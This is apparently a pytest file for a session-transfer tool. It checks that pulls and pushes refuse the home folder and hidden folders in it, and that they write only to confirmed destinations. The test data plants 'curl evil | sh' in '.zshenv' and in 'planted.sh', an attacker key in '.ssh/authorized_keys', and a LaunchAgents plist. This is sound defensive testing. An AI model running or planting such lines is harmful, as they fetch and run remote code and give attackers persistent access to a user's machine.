"""Where a workspace may come from and go to: never the home folder, a folder containing it, or a hidden folder in
it; and, for a session with no push record here, only a folder the user confirmed."""

import io
import os
import sys

import pytest

from ctransfer import apply, bundle, cli, sessions, workspace
from tests.conftest import run_git

SID = "6f1d2c3b-0a9e-4b8c-8d7f-1e2a3b4c5d6e"


@pytest.fixture
def home(tmp_path, monkeypatch):
    """$HOME is a temp folder with ~/.claude in it."""
    home = tmp_path / "home"
    (home / ".claude").mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    return home


def _files(root) -> dict:
    return {str(f.relative_to(root)): f.read_bytes() for f in sorted(root.rglob("*")) if f.is_file()}


def _vm_export(tmp_path, files: dict, cwd: str) -> dict:
    """A cloud copy of a plain folder holding files, recorded (as the VM does) as the folder cwd; extracted under
    tmp_path/x as pull receives it."""
    vm_folder = tmp_path / "vm" / "folder"
    vm_folder.mkdir(parents=True)
    for name, data in files.items():
        (vm_folder / name).parent.mkdir(parents=True, exist_ok=True)
        (vm_folder / name).write_text(data)
    vm_home = tmp_path / "vm" / ".claude"
    vm_home.mkdir()
    bundle.build(tmp_path / "export.tgz", kind="export", home=vm_home, session_id=SID, project_dir="-proj", cwd=cwd,
                 workspace_dir=str(vm_folder), record_root=cwd)
    return bundle.extract(tmp_path / "export.tgz", tmp_path / "x")


def test_pull_without_a_push_record_never_writes_into_the_home_folder(tmp_path, home):
    """The audit's proof of concept: with no push record, a compromised service names $HOME as the session's folder
    and the cloud copy carries login files. Nothing is written."""
    manifest = _vm_export(tmp_path, {".zshenv": "curl evil | sh\n", ".ssh/authorized_keys": "ssh-ed25519 AAAA evil\n",
                                     "Library/LaunchAgents/evil.plist": "<plist/>\n"}, str(home))
    before = _files(home)
    with pytest.raises(apply.ApplyError, match="is your home folder or contains it. Nothing was changed"):
        apply.apply_export(tmp_path / "x", manifest, home=home / ".claude",
                           expect=apply.transfer_copy({"session_id": SID, "cwd": str(home)}))
    assert _files(home) == before

    with pytest.raises(apply.ApplyError, match="home folder"):
        cli.confirm_destination("t1", str(home), str(home))  # not even when confirmed


@pytest.mark.parametrize("where", ["", ".ssh", ".config/x"])
def test_pull_refuses_the_home_folder_and_hidden_folders_in_it_before_stopping_the_vm(home, where):
    root = home / where
    root.mkdir(parents=True, exist_ok=True)
    pushed = {"session_id": SID, "project_dir": "-p", "record_count": 0, "last_uuid": None,
              "workspace": {"kind": "tree", "root": str(root), "files": {}}}
    with pytest.raises(apply.ApplyError, match="Nothing was changed"):
        apply.check_before_export(pushed, home=home / ".claude")


@pytest.mark.parametrize("where, refused", [
    ("", True), (".config/tool", True), (".ssh", True), ("src/proj", False), ("src/.cache/x", True),
])
def test_push_refuses_the_home_folder_and_hidden_folders_in_it(tmp_path, home, where, refused):
    folder = home / where
    folder.mkdir(parents=True, exist_ok=True)
    (folder / "a.txt").write_text("a\n")

    def build():
        return bundle.build(tmp_path / "b.tgz", kind="new", home=home / ".claude", session_id=SID,
                            project_dir=sessions.encode_project_dir(str(folder)), cwd=str(folder))
    if refused:
        with pytest.raises(bundle.BundleError, match="won't send this workspace: .*Start Claude Code in a project"):
            build()
    else:
        assert build()["workspace"]["root"] == str(folder)


def test_push_refuses_a_folder_containing_home(tmp_path, home):
    with pytest.raises(bundle.BundleError, match="contains it"):
        bundle.build(tmp_path / "b.tgz", kind="new", home=home / ".claude", session_id=SID, project_dir="-",
                     cwd=str(home.parent))


def test_push_from_inside_a_repo_at_the_home_folder_is_refused(tmp_path, home):
    """A dotfiles repo at ~ makes ~ the workspace even when Claude Code runs in a subfolder of it."""
    run_git(home, "init", "-q")
    (home / ".zshrc").write_text("x\n")
    run_git(home, "add", ".zshrc")
    run_git(home, "-c", "user.email=t@e", "-c", "user.name=t", "commit", "-q", "-m", "dotfiles")
    (home / "notes").mkdir()
    with pytest.raises(bundle.BundleError, match="home folder"):
        bundle.build(tmp_path / "b.tgz", kind="new", home=home / ".claude", session_id=SID, project_dir="-",
                     cwd=str(home / "notes"))


def test_pull_without_a_push_record_needs_the_folder_confirmed(tmp_path, home, monkeypatch):
    """Not in a terminal (e.g. /ctransfer pull): refused, naming the folder and the flag that confirms it. With the
    flag it must be that folder."""
    proj = home / "src" / "proj"
    proj.mkdir(parents=True)
    monkeypatch.setattr(sys, "stdin", io.StringIO(""))
    with pytest.raises(apply.ApplyError, match=rf"won't write its workspace to {proj} without your say-so\. Nothing "
                                               rf"was changed\. .*ctransfer pull t1 --workspace-dir {proj}$"):
        cli.confirm_destination("t1", str(proj), None)
    cli.confirm_destination("t1", str(proj), str(proj))
    with pytest.raises(apply.ApplyError, match=f"goes to {proj}, not {tmp_path}"):
        cli.confirm_destination("t1", str(proj), str(tmp_path))
    with pytest.raises(apply.ApplyError, match="no usable folder"):
        cli.confirm_destination("t1", "relative/path", None)


class _Terminal(io.StringIO):
    def isatty(self):
        return True


@pytest.mark.parametrize("answer, goes_ahead", [("y\n", True), ("yes\n", True), ("\n", False), ("n\n", False)])
def test_pull_without_a_push_record_asks_in_a_terminal(home, monkeypatch, capsys, answer, goes_ahead):
    proj = home / "src" / "proj"
    proj.mkdir(parents=True)
    monkeypatch.setattr(sys, "stdin", _Terminal(answer))
    if goes_ahead:
        cli.confirm_destination("t1", str(proj), None)
    else:
        with pytest.raises(SystemExit, match="nothing was changed"):
            cli.confirm_destination("t1", str(proj), None)
    shown = capsys.readouterr()
    assert f"would be written to:\n  {proj}" in shown.err and "N stops here and changes nothing" in shown.out


class _Service:
    """Stands in for the control plane (an external service to this repo) across one pull: running until asked to
    export, then exported, where it names another folder (as a compromised service could) than it did at first."""

    def __init__(self, sid: str, cwd: str, later_cwd: str, download_url: str):
        self.state, self.sid, self.cwd, self.later_cwd, self.url = "running", sid, cwd, later_cwd, download_url

    def call(self, method, path, body=None):
        if method == "POST" and path.endswith("/export"):
            self.state = "exported"
            return {}
        if method == "GET":
            if self.state == "running":
                return {"transfer_id": "t1", "state": "running", "session_id": self.sid, "cwd": self.cwd}
            return {"transfer_id": "t1", "state": "exported", "session_id": self.sid, "cwd": self.later_cwd,
                    "download_url": self.url}
        return {}


def test_pull_writes_only_to_the_folder_confirmed_before_the_export(tmp_path, home, monkeypatch):
    proj, other = home / "src" / "proj", home / "src" / "other"
    proj.mkdir(parents=True)
    other.mkdir()
    _vm_export(tmp_path, {"planted.sh": "curl evil | sh\n"}, str(other))
    service = _Service(SID, str(proj), str(other), (tmp_path / "export.tgz").as_uri())
    monkeypatch.setattr(sys, "stdin", io.StringIO(""))

    with pytest.raises(apply.ApplyError, match=rf"workspace \(tree at {other}\) is not the one .*\(tree at {proj}\)"):
        cli.pull(service, "t1", home=home / ".claude", workspace_dir=str(proj), sleep=lambda s: None)
    assert list(other.iterdir()) == [] and list(proj.iterdir()) == []


@pytest.mark.parametrize("named", ["HOME", "HOME/.ssh", "HOME/src/.cache"])
def test_home_named_another_way_is_still_the_home_folder(tmp_path, home, monkeypatch, named):
    """On a case-insensitive file system (macOS) a service can name the home folder in other letters: compared by
    identity, it is still refused. The file system is made case-insensitive for "HOME" here."""
    (home / ".ssh").mkdir()
    (home / "src" / ".cache").mkdir(parents=True)
    real_stat = os.stat

    def stat(path, *args, **kwargs):
        return real_stat(str(path).replace(f"{home.parent}/HOME", str(home)), *args, **kwargs)
    monkeypatch.setattr(os, "stat", stat)
    alias = f"{home.parent}/{named}"
    with pytest.raises(apply.ApplyError, match="home folder"):
        cli.confirm_destination("t1", alias, alias)
